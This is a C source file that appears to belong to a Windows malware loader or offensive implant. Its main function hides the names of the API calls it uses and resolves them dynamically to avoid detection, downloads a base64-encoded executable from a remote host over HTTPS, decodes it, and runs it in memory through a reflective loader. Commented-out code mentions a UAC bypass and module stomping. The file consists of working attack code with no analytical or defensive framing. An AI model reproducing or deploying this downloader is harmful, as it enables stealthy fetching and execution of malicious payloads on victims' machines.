#include "WebUtilities.h"

void parseUrl(char* inUrl, char* outHostName, char* outFilePath) {
	if (inUrl[5] == 58)
		inUrl = inUrl + 8; // move str up past https://
	if (inUrl[4] == 58)
		inUrl = inUrl + 7; // move str up past http://

	//obtain the hostname & the filepath by finding the offset of the first / in the file path.
	for (int i = 0; i < strlen(inUrl); i++) {
		if (inUrl[i] == 47)
		{
			memcpy(outHostName, inUrl, i);
			outHostName[i] = '\0';

			inUrl = inUrl + i;
			memcpy(outFilePath, inUrl, strlen(inUrl));
			outFilePath[strlen(inUrl)] = '\0';
			break;
		}
	}

	
}

void randomStrGenerator(char * rand_str) {
	
	char char1[] = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
					'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
					'1','2','3','4','5','6','7','8','9','0'};
	for (int i = 0; i < 31; i++) {
		rand_str[i] = char1[rand() % (sizeof(char1) - 1)];
	}
	rand_str[30] = '\0';
	return rand_str;
}

// WinHTTP Functions
void do_request(const char* hostName, const char* resourcePath, const char * targetHeader, char * targetOutFilePath) {

	//loadLibrary strings.
	WCHAR strKernel32dll[] = { 'K','e','r','n','e','l','3','2','.','d','l','l',0x0 };
	unsigned char strLoadLibraryW[] = { 'L','o','a','d','L','i','b','r','a','r','y','W',0x0 };

	//dynamically resolve the loadlibrary function
	t_LoadLibraryW pLoadLibraryW = (t_LoadLibraryW)hlpGetProcAddress(hlpGetModuleHandle(strKernel32dll), (LPCSTR)strLoadLibraryW);

	// Create pointers for each function used.
	t_CryptStringToBinaryW pCryptStringToBinaryW = NULL;
	t_InternetCloseHandle pInternetCloseHandle = NULL;
	t_InternetReadFile pInternetReadFile = NULL;
	t_HttpQueryInfoA pHttpQueryInfoA = NULL;
	t_HttpSendRequestA pHttpSendRequestA = NULL;
	t_HttpOpenRequestA pHttpOpenRequestA = NULL;
	t_InternetConnectA pInternetConnectA = NULL;
	t_InternetOpenA pInternetOpenA = NULL;
	t_CreateFileA pCreateFileA = NULL;
	t_WriteFile pWriteFile = NULL;

	//Create DLL Strings
	WCHAR strCrypt32[] = { 'C','r','y','p','t','3','2','.','d','l','l', 0x0 };
	WCHAR strWinInet[] = { 'W','i','n','i','n','e','t','.','d','l','l', 0x0 };

	//Create Function Name Strings
	unsigned char strCryptStringToBinaryW[] = { 'C','r','y','p','t','S','t','r','i','n','g','T','o','B','i','n','a','r','y','W', 0x0 };
	unsigned char strInternetOpenA[] = { 'I','n','t','e','r','n','e','t','O','p','e','n','A', 0x0 };
	unsigned char strInternetConnectA[] = { 'I','n','t','e','r','n','e','t','C','o','n','n','e','c','t','A',0x0 };
	unsigned char strHttpOpenRequestA[] = { 'H','t','t','p','O','p','e','n','R','e','q','u','e','s','t','A',0x0 };
	unsigned char strHttpSendRequestA[] = { 'H','t','t','p','S','e','n','d','R','e','q','u','e','s','t','A',0x0 };
	unsigned char strHttpQueryInfoA[] = { 'H','t','t','p','Q','u','e','r','y','I','n','f','o','A',0x0};
	unsigned char strInternetReadFile[] = { 'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e',0x0};
	unsigned char strInternetCloseHandle[] = { 'I','n','t','e','r','n','e','t','C','l','o','s','e','H','a','n','d','l','e',0x0};
	unsigned char strCreateFileA[] = { 'C','r','e','a','t','e','F','i','l','e','A',0x0 };
	unsigned char strWriteFile[] = { 'W','r','i','t','e','F','i','l','e',0x0 };

	//load the needed libraries.
	pLoadLibraryW(strWinInet);
	pLoadLibraryW(strCrypt32);

	//resolve function pointers.
	pCryptStringToBinaryW = (t_CryptStringToBinaryW)hlpGetProcAddress(hlpGetModuleHandle(strCrypt32), (LPCSTR)strCryptStringToBinaryW);
	pInternetOpenA = (t_InternetOpenA)hlpGetProcAddress(hlpGetModuleHandle(strWinInet), (LPCSTR)strInternetOpenA);
	pInternetConnectA = (t_InternetConnectA)hlpGetProcAddress(hlpGetModuleHandle(strWinInet), (LPCSTR)strInternetConnectA);
	pInternetReadFile = (t_InternetReadFile)hlpGetProcAddress(hlpGetModuleHandle(strWinInet), (LPCSTR)strInternetReadFile);
	pInternetCloseHandle = (t_InternetCloseHandle)hlpGetProcAddress(hlpGetModuleHandle(strWinInet), (LPCSTR)strInternetCloseHandle);
	pHttpOpenRequestA = (t_HttpOpenRequestA)hlpGetProcAddress(hlpGetModuleHandle(strWinInet), (LPCSTR)strHttpOpenRequestA);
	pHttpSendRequestA = (t_HttpOpenRequestA)hlpGetProcAddress(hlpGetModuleHandle(strWinInet), (LPCSTR)strHttpSendRequestA);
	pHttpQueryInfoA = (t_HttpQueryInfoA)hlpGetProcAddress(hlpGetModuleHandle(strWinInet), (LPCSTR)strHttpQueryInfoA);
	pCreateFileA = (t_CreateFileA)hlpGetProcAddress(hlpGetModuleHandle(strKernel32dll), (LPCSTR)strCreateFileA);
	pWriteFile = (t_WriteFile)hlpGetProcAddress(hlpGetModuleHandle(strKernel32dll), (LPCSTR)strWriteFile);


	//char rand_str[31] = "";
	//randomStrGenerator(rand_str);
	//setup variables
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	
	BOOL  bResults = FALSE;
	HINTERNET  hInternet = NULL,
		hConnect = NULL,
		hRequest = NULL;
	
	// initialize WinHTTP Object
	hInternet = pInternetOpenA("WinInet Test/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	//specify http server
	if(hInternet)
		hConnect = pInternetConnectA(hInternet, hostName, INTERNET_DEFAULT_HTTPS_PORT,NULL,NULL, INTERNET_SERVICE_HTTP, 0, 0);

	// Create an HTTP request handler
	char* rgpszAcceptTypes[] = { "text/html","application / xhtml + xml","application / xml; q = 0.9","image / avif","image / webp"," */*;q=0.8",NULL };
	if(hConnect)
		hRequest = pHttpOpenRequestA(hConnect, "GET", resourcePath, NULL, NULL, rgpszAcceptTypes, INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
	// send request & receive response.
	if (hRequest)
		bResults = pHttpSendRequestA(hRequest, NULL, NULL, NULL, NULL);
	// set up response header query.
	LPVOID requestHeaders = (char*)malloc(50);
	DWORD duhSize = 50;
	ZeroMemory(requestHeaders, duhSize);
	lstrcatA(requestHeaders, targetHeader);
	//query the targeted responder header.
	if (hRequest)
		bResults = pHttpQueryInfoA(hRequest, HTTP_QUERY_CUSTOM, (LPVOID)requestHeaders, &duhSize, 0);

	//convert content length to integer value.
	const int contentLen = atoi(requestHeaders);


	//obtain the filename from the http headers. example: attachment;%20filename=BreadManModuleStomping_b64.txt append it for full file path.
	//char fileName[50] = { 0 };
	//lstrcatA(targetOutFilePath, rand_str);
	//char extension[5] = { '.','e','x','e',0x0};
	//lstrcpyA(targetOutFilePath + strlen(targetOutFilePath) - 4, extension);

	DWORD dwByteRead = 0;
	//create buffer to store the base64 content.
	LPVOID pszOutBuffer = (wchar_t*)malloc(contentLen);
	//Read File store & in buffer.
	bResults = pInternetReadFile(hRequest, (LPVOID)pszOutBuffer, contentLen, &dwByteRead);
	
	// close handles
	pInternetCloseHandle(hRequest);
	pInternetCloseHandle(hConnect);
	pInternetCloseHandle(hInternet);

	unsigned char fileExe_buff[100000] = { 0 };
	DWORD flagUsed = 0;
	DWORD size = 100000;
	//convert base64 buffer into exe bytes.
	if (!pCryptStringToBinaryW(pszOutBuffer, 0, 1, fileExe_buff, &size, 0, &flagUsed))
		exit(-1);

	ZeroMemory(pszOutBuffer, contentLen);
	free(pszOutBuffer);
	//output exe bytes into file.  -- deprecated b/c we are going to reflectively load the executable in memory.
	//HANDLE hOut = NULL;
	//DWORD numBytesRead = 0;
	//hOut = pCreateFileA(targetOutFilePath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, NULL, NULL);
	//bResults = pWriteFile(hOut, fileExe_buff, size, &numBytesRead, 0);

	//CloseHandle(hOut);

	//setUpUACBypass(targetOutFilePath); -- deprecated UAC bypass no longer works.
	
	//get base address
	ULONG_PTR baseAddress = fileExe_buff;

	reflectiveLoader(baseAddress);
}

